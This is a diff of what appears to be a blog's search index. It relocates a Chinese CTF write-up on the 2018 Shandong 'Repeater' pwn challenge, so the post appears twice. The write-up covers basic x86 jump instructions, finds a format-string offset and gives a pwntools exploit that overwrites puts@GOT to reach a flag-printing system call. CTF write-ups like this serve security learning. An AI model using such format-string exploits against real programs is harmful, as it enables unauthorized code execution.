@@ -92,23 +92,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>[Pwn]2018年山东省科来杯Pwn题目Repeater复现</title>
-    <url>/2022/05/12/%5BPwn%5D2018%E5%B9%B4%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%A7%91%E6%9D%A5%E6%9D%AFPwn%E9%A2%98%E7%9B%AERepeater%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="2018年山东省科来杯Pwn题目Repeater复现"><a href="#2018年山东省科来杯Pwn题目Repeater复现" class="headerlink" title="2018年山东省科来杯Pwn题目Repeater复现"></a>2018年山东省科来杯Pwn题目Repeater复现</h1><h2 id="补充一点汇编语言基础知识"><a href="#补充一点汇编语言基础知识" class="headerlink" title="补充一点汇编语言基础知识"></a>补充一点汇编语言基础知识</h2><p>对于我这种对汇编语言不怎么感冒的人来说，补充一些相应的汇编语言的基础知识还是很重要的</p>
-<p>这里就针对本题中用到的汇编指令进行相应补充</p>
-<p>lea与mov的区别：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax (相当于把地址赋给eax)，而不是把ebx+8处的内存地址里的数据赋给eax。</p>
-<p>而mov指令则恰恰相反，例如：<br>mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p>
-<p>cmp(compare)指令进行比较两个操作数的大小，若执行指令后ZF&#x3D;1<br>则说明两个数相等，因为zero为1说明结果为0。</p>
-<p>jnz结果不为零（或不相等）则转移，jz即零标志为1就跳转。<br>ZF汇编语言中的PSW标志寄存器中的一位，而JZ则是根据ZF决定是否跳转。<br>jz&#x3D;jump if zero，即零标志为1就跳转，一般与cmp连用，用以判断两数是否相等。jz的另一种写法就是je，je&#x3D;jump if equal，jz和je的作用是完全一样的。</p>
-<span id="more"></span>
-<h2 id="Repeater-WP"><a href="#Repeater-WP" class="headerlink" title="Repeater WP"></a>Repeater WP</h2><p>checksec 一下题目所给文件<br><img src="https://img-blog.csdnimg.cn/20201030103445340.png#pic_center" alt="在这里插入图片描述"><br>运行一下试试看<br><img src="https://img-blog.csdnimg.cn/20201030104011498.png#pic_center" alt="在这里插入图片描述"><br>好像看不出什么<br>测试一下格式化字符串漏洞<br><img src="https://img-blog.csdnimg.cn/20201030104054282.png#pic_center"><br>数一下 偏移为4<br>丢进ida看一下主程序<br>ctrl 1 看一下字符串，发现敏感字符串<br><img src="https://img-blog.csdnimg.cn/20201030104207828.png#pic_center" alt="在这里插入图片描述"><br>双击 ctrl x 跟进<br><img src="https://img-blog.csdnimg.cn/20201030104347614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以发现程序有call语句调用system，而system就是输出flag地址从而得到flag</p>
-<p>但是根据上面的汇编语句或者getflag字段内容可以发现这里存在一个判断语句<br><img src="https://img-blog.csdnimg.cn/20201030104723973.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030104802774.png#pic_center" alt="在这里插入图片描述"><br>2018h &#x3D; (8216)₁₀，判断 eax是否等于8216 ，ZF&#x3D;1则两数相等，相应的ZF&#x3D;1意味着结果为0，即jnz不跳转。随即执行将eax压入栈，再执行call语句调用，即可得到flag。</p>
-<p>根据偏移为4 编写exp脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./repeater&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./repeater&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;your msg:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;puts_got:<span class="number">0x8048638</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>运行即可得到flag</p>
-]]></content>
-  </entry>
-  <entry>
     <title>[Pwn]攻防世界pwn题目wp--guess_num,hello_pwn</title>
     <url>/2022/05/12/%5BPwn%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%A2%98%E7%9B%AEwp--guess_num,hello_pwn/</url>
     <content><![CDATA[<h1 id="pwn-学习篇"><a href="#pwn-学习篇" class="headerlink" title="pwn 学习篇"></a>pwn 学习篇</h1><h2 id="0x1-guess-num"><a href="#0x1-guess-num" class="headerlink" title="0x1 guess_num"></a>0x1 guess_num</h2><p>下载题目所给附件，使用checksec 进行查看<img src="https://img-blog.csdnimg.cn/20201003155157923.png#pic_center" alt="在这里插入图片描述"><br>发现是一个 64bit的文件，relro开启了部分保护以及开启了NX保护</p>
@@ -149,6 +132,23 @@
 <p><del>对csv可视化的思想：先把csv文件中的内容读取出来再进行可视化</del></p>
 <p><img src="/images/pasted-0.png" alt="upload successful"><br>报403是因为，通过上述代码获取的url为zhipin.com的原url，而非在本地localhost的url，此前访问时ip已被封，所以报错403</p>
 <p><del>转化为json文件，再做可视化，json文件中的数据是以dict存储的因此比较方便易用</del><br>数据格式方面：pyecharts 本质上在做的事情就是将 Echarts 的配置项由 Python dict 序列化为 JSON 格式，所以 pyecharts 支持什么格式的数据类型取决于 JSON 支持什么数据类型。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>[Pwn]2018年山东省科来杯Pwn题目Repeater复现</title>
+    <url>/2022/05/12/%5BPwn%5D2018%E5%B9%B4%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%A7%91%E6%9D%A5%E6%9D%AFPwn%E9%A2%98%E7%9B%AERepeater%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="2018年山东省科来杯Pwn题目Repeater复现"><a href="#2018年山东省科来杯Pwn题目Repeater复现" class="headerlink" title="2018年山东省科来杯Pwn题目Repeater复现"></a>2018年山东省科来杯Pwn题目Repeater复现</h1><h2 id="补充一点汇编语言基础知识"><a href="#补充一点汇编语言基础知识" class="headerlink" title="补充一点汇编语言基础知识"></a>补充一点汇编语言基础知识</h2><p>对于我这种对汇编语言不怎么感冒的人来说，补充一些相应的汇编语言的基础知识还是很重要的</p>
+<p>这里就针对本题中用到的汇编指令进行相应补充</p>
+<p>lea与mov的区别：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax (相当于把地址赋给eax)，而不是把ebx+8处的内存地址里的数据赋给eax。</p>
+<p>而mov指令则恰恰相反，例如：<br>mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p>
+<p>cmp(compare)指令进行比较两个操作数的大小，若执行指令后ZF&#x3D;1<br>则说明两个数相等，因为zero为1说明结果为0。</p>
+<p>jnz结果不为零（或不相等）则转移，jz即零标志为1就跳转。<br>ZF汇编语言中的PSW标志寄存器中的一位，而JZ则是根据ZF决定是否跳转。<br>jz&#x3D;jump if zero，即零标志为1就跳转，一般与cmp连用，用以判断两数是否相等。jz的另一种写法就是je，je&#x3D;jump if equal，jz和je的作用是完全一样的。</p>
+<span id="more"></span>
+<h2 id="Repeater-WP"><a href="#Repeater-WP" class="headerlink" title="Repeater WP"></a>Repeater WP</h2><p>checksec 一下题目所给文件<br><img src="https://img-blog.csdnimg.cn/20201030103445340.png#pic_center" alt="在这里插入图片描述"><br>运行一下试试看<br><img src="https://img-blog.csdnimg.cn/20201030104011498.png#pic_center" alt="在这里插入图片描述"><br>好像看不出什么<br>测试一下格式化字符串漏洞<br><img src="https://img-blog.csdnimg.cn/20201030104054282.png#pic_center"><br>数一下 偏移为4<br>丢进ida看一下主程序<br>ctrl 1 看一下字符串，发现敏感字符串<br><img src="https://img-blog.csdnimg.cn/20201030104207828.png#pic_center" alt="在这里插入图片描述"><br>双击 ctrl x 跟进<br><img src="https://img-blog.csdnimg.cn/20201030104347614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以发现程序有call语句调用system，而system就是输出flag地址从而得到flag</p>
+<p>但是根据上面的汇编语句或者getflag字段内容可以发现这里存在一个判断语句<br><img src="https://img-blog.csdnimg.cn/20201030104723973.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030104802774.png#pic_center" alt="在这里插入图片描述"><br>2018h &#x3D; (8216)₁₀，判断 eax是否等于8216 ，ZF&#x3D;1则两数相等，相应的ZF&#x3D;1意味着结果为0，即jnz不跳转。随即执行将eax压入栈，再执行call语句调用，即可得到flag。</p>
+<p>根据偏移为4 编写exp脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./repeater&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./repeater&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;your msg:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;puts_got:<span class="number">0x8048638</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行即可得到flag</p>
 ]]></content>
   </entry>
 </search>
